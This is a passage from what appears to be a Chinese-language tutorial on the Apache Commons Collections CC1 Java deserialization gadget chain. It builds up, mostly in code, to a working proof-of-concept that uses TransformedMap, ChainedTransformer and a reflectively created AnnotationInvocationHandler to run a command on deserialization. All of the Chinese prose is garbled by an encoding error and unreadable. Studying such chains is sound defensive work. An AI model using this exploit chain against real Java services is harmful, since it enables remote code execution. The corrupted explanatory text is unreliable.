&quot;æ–°å€¼&quot;)`å¯èƒ½ç»•å¼€å¤–æŒ‚ç¨‹åºï¼Œéå†åé€šè¿‡`entry.setValue()`ä¿®æ”¹ï¼Œæ‰èƒ½ç¡®ä¿å¤–æŒ‚ç¨‹åºè¢«è°ƒç”¨ï¼Œ**åº•å±‚åŸå› ï¼šTransformedMap`çš„`Map.Entry`æ˜¯æ”¹è£…è¿‡çš„ï¼ˆ`AbstractMapEntryDecorator`çš„å­ç±»ï¼‰ï¼Œå®ƒçš„`setValue()`æ–¹æ³•è¢«é‡å†™ï¼Œä¸»åŠ¨è°ƒç”¨`checkSetValue()ï¼Œéå†æ˜¯ç¡®ä¿æ¯ä¸ª`Entry`éƒ½ä½¿ç”¨æ”¹è£…åçš„æ–¹æ³•çš„å…³é”®æ­¥éª¤ </span><br></pre></td></tr></table></figure><p>ä¸€å¥è¯å°±æ˜¯ç¡®ä¿æ¯ä¸ª<code>Entry</code>éƒ½ä½¿ç”¨æ”¹è£…åçš„æ–¹æ³•ï¼Œè¿›è€Œæ›´å¥½è°ƒç”¨setvalueå»è°ƒç”¨checkSetvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">â€‹    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">â€‹    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">â€‹            map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">â€‹        <span class="comment">//è°ƒç”¨setValueæ–¹æ³•ï¼Œé€šè¿‡setValueå»è§¦å‘checkSetValue()</span></span><br><span class="line">â€‹        entry.setValue(runtime);      </span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry:transformedMap.entrySet()) &#123;   *//éå†Mapå¸¸ç”¨æ ¼å¼*    entry.setValue(runtime);                      &#125;</span><br></pre></td></tr></table></figure><p>  åœ¨è¿™é‡Œï¼Œ transformedMapæ˜¯ç»è¿‡è£…é¥°çš„ Mapå¯¹è±¡ï¼Œå…·æœ‰ç‰¹æ®Šçš„è¡Œä¸ºã€‚é€šè¿‡ entrySet() æ–¹æ³•è·å–äº†é”®å€¼å¯¹çš„é›†åˆï¼Œç„¶åè¿›è¡Œéå†ã€‚transformedMap.entrySet()è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ…å« <code>Map.Entry</code> å¯¹è±¡çš„é›†åˆï¼Œè¿™æ ·å°±å¯ä»¥éå† M ap çš„é”®å€¼å¯¹ã€‚Map.Entry æ˜¯ä¸€ä¸ªå†…éƒ¨æ¥å£ï¼Œç”¨äºè¡¨ç¤º<code>Map</code>ä¸­ çš„é”®å€¼å¯¹ï¼Œå…¶ä¸­å¯ä»¥é€šè¿‡ getKey() è·å–é”®ï¼Œé€šè¿‡ getValue()è·å–å€¼ã€‚</p><p>å› ä¸ºMapé‡Œçš„entrySet()æ˜¯è¢«transformedMapè£…é¥°å™¨è¿›è¡Œå¤–æŒ‚çš„ï¼Œæœ¬æ¥æ˜¯è¦å»Mapç§çš„setvalueæ–¹æ³•ï¼Œä½†æ˜¯ç»è¿‡è£…é¥°å™¨çš„å®šä¹‰ç»˜åˆ¶è¡—é“MapEntryç§è°ƒç”¨é‡Œé¢çš„setValueæ–¹æ³•è¿›è€Œå»è°ƒç”¨checkSetValueæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/d7418d2c06802f2f2f3715b5cd7b0d2.png"></p><p>æ¢³ç†</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/9b9e63ced9a4747901d62b2c7088a6c.png"></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†TransformedMapè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨å…¶ä¸­çš„checkSetValueæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»çš„æ„é€ å™¨æ˜¯peotectedæƒé™ï¼Œåªèƒ½ç±»ä¸­è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬è°ƒç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œ</p><p> åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªHashMap,å¹¶ä¸”è°ƒç”¨äº†putæ–¹æ³•ç»™ä»–èµ‹äº†ä¸€ä¸ªé”®å€¼å¯¹(è¿™é‡Œæ˜¯ä¸ºäº†è®©æˆ‘ä»¬å†åè¾¹çš„éå†ä¸­è°ƒç”¨setValue()æä¾›å‰ç½®æ¡ä»¶)ï¼Œç„¶åæŠŠè¿™ä¸ªmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œå®ä¾‹åŒ–æˆäº†ä¸€ä¸ªtransformedmapå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿæ˜¯Mapç±»å‹çš„ï¼Œ</p><p> ç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œè€Œæ°å¥½åˆé‡åˆ°äº†ä¸€ä¸ªé‡å†™äº†setValueçš„çˆ¶ç±»ï¼Œè¿™ä¸ªé‡å†™çš„æ–¹æ³•åˆšå¥½è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé—­ç¯</p><p><strong>è¿½å¯»setValueï¼Œæ‰¾åˆ°readObject()</strong></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°äº†readobjectä¸‹è°ƒç”¨äº†setvalue</p><p>ç”±äºmemberValueså¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥è‡ªå·±éœ€è¦çš„ï¼Œç„¶åå®ç°setValueæ–¹æ³•</p><p>ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰è¯´æ˜æ˜¯ä¸æ˜¯publicä¹‹ç±»çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªèƒ½åœ¨åŒ…é‡Œé¢è¿›è¡Œdiaoyongï¼Œè¦æƒ³åœ¨å¤–éƒ¨è°ƒç”¨çš„è¯å°±å¿…é¡»ä½¿ç”¨åå°„</p><p>copyçš„ç²—ç•¥çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æŒ‡å®šå‚æ•°ç±»å‹çš„æ„é€ å‡½æ•°Constructorå¯¹è±¡ï¼Œè¿™é‡Œæˆ‘ä»¬èƒ½è·å–åˆ°ä¼°è®¡å°±æ˜¯å®ƒçš„é‚£ä¸ªæ„é€ å‡½æ•°</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// ç›¸å½“äºæå‡è‡ªå·±æƒé™ï¼Œä»¥ä¾¿å¯ä»¥è®¿é—®éå…¬å…±æ„é€ å‡½æ•°</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°æ˜¯æ³¨è§£çš„ç±»åŸå‹ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç±»</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨newInstance()æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„AnnotationInvocationHandlerå®ä¾‹</span></span><br><span class="line"><span class="comment">// ä¼ é€’Override.classå’Œdecorateä¸¤ä¸ªå‚æ•°ç»™æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line">serialize(o);  <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">unserialize(<span class="string">&quot;CC1.txt&quot;</span>); <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.txt&quot;</span>));</span><br><span class="line">   oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">   ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">   objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨</p><h1 id="è§£å†³ä¸‰ä¸ªé—®é¢˜"><a href="#è§£å†³ä¸‰ä¸ªé—®é¢˜" class="headerlink" title="è§£å†³ä¸‰ä¸ªé—®é¢˜"></a>è§£å†³ä¸‰ä¸ªé—®é¢˜</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–</span><br><span class="line">2. AnnotationInvocationHandlerä¸­çš„readObjectæ‰§è¡Œ memberValue.setValueéœ€è¦ç»•è¿‡ä¸¤ifåˆ¤æ–­</span><br><span class="line">3. memberValue.setValueä¸­çš„å€¼æ— æ³•æ§åˆ¶</span><br></pre></td></tr></table></figure><h3 id="Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–"><a href="#Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–" class="headerlink" title="Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–"></a>Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–</h3><p>è™½ç„¶Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œå¯ä»¥è¿ç”¨åå°„æ¥è·å–å®ƒçš„åŸå‹ç±»ï¼Œå®ƒçš„åŸå‹ç±»Classæ˜¯å­˜åœ¨serializableæ¥å£ï¼Œå¯ä»¥åºåˆ—åŒ–çš„</p><p>æ”¹æˆä¸‹é¢è¿™ç§å½¢å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//è·å–ç±»åŸå‹</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//è·å–getRuntimeæ–¹æ³•ï¼Œ</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//è·å–å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸ºæ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥å…¨ä¸ºnull</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//è·å–execæ–¹æ³•</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);                                         <span class="comment">//å®ç°å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹æˆè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼›ä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œä¸Šé¢ä¸€å…±æ‰§è¡Œäº†ä¸‰æ¬¡<code>transform</code>æ–¹æ³•ã€‚ä½†æ˜¯<code>InvokerTransformer</code>ç±»ä¸­åªèƒ½æ‰§è¡Œä¸€æ¬¡<code>transform</code>æ–¹æ³•ï¼›</p><p>è¿™é‡Œåˆè¦ä»‹ç»ä¸€ä¸ªéœ€è¦åˆ©ç”¨çš„ç±»<code>ChainedTransformer</code>;å¯ä»¥çœ‹ä¸€ä¸‹æ­¤ç±»çš„æ„é€ æ–¹æ³•å’Œ<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¼ é€’ä¸€ä¸ªtransformersæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸€ä¸ªforå¾ªç¯ï¼Œå°†ä¸Šä¸€ä¸ªå¯¹è±¡å½“ä½œä¸‹ä¸€ä¸ªå‡½æ•°æ‰§è¡Œï¼Œå¾ªç¯åµŒå¥—</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨chainedTransformer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  <span class="comment">//è·å–åŸå‹ç±»</span></span><br><span class="line">     Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="comment">//è°ƒç”¨å«å‚æ„é€ å™¨ä¼ å…¥Transformeræ•°ç»„ï¼Œç„¶åè°ƒç”¨transformæ–¹æ³•ï¼Œè¿™é‡Œå¯¹è±¡åªéœ€è¦ä¼ ä¸€ä¸ªåŸå§‹çš„Runtimeå°±è¡Œï¼Œå› ä¸ºå…¶ä»–éƒ½æ˜¯åµŒå¥—çš„ã€‚</span></span><br><span class="line">     ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥è¿è¡Œ</p><h3 id="è§£å†³setValue-æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› "><a href="#è§£å†³setValue-æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› " class="headerlink" title="è§£å†³setValue()æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› "></a><strong>è§£å†³setValue()æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› </strong></h3><p>setValue()æ–¹æ³•æ˜¯åœ¨ä¸¤ä¸ªifè¯­å¥ä¸‹è¾¹</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/e333e860070dd6d46ab0d3bfcd2a90f.png"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªifè¯­å¥æ‰èƒ½æ‰§è¡Œ</p><p>ç¬¬ä¸€ä¸ªifå°±æ˜¯åˆ¤æ–­ç±»å‹è¦ä¸ä¸ºç©º</p><p>ç¬¬äºŒä¸ªif</p><p>memberType.isInstance(value) || value instanceof ExceptionProxyï¼šè¡¨ç¤º value æ˜¯ memberType ç±»å‹çš„å®ä¾‹ï¼Œæˆ–è€…æ˜¯ ExceptionProxy ç±»å‹ã€‚</p><p>!()ï¼šå¯¹æ•´ä¸ªæ¡ä»¶å–åã€‚ï¼Œå¦‚æœ value æ—¢ä¸æ˜¯ memberType çš„å®ä¾‹ï¼Œä¹Ÿä¸æ˜¯ ExceptionProxyï¼Œæ¡ä»¶ä¸ºçœŸï¼Œè¿›å…¥ if å—ã€‚</p><h3 id="è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜"><a href="#è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜" class="headerlink" title="è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜"></a><strong><strong>è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜</strong></strong></h3><p>å¤„ç†å®Œifå‘ç°ä¼ è¿›å»çš„å‚æ•°æˆ‘ä»¬ä¸å¯æ§</p><p>è¿™é‡Œéœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªç±»ConstantTransformerï¼›è¿™ä¸ªç±»éå¸¸æœ‰æ„æ€ï¼Œæ„é€ æ–¹æ³•ä¼ é€’ä»€ä¹ˆå€¼ï¼Œtransformå°±è¿”å›ä»€ä¹ˆå€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span 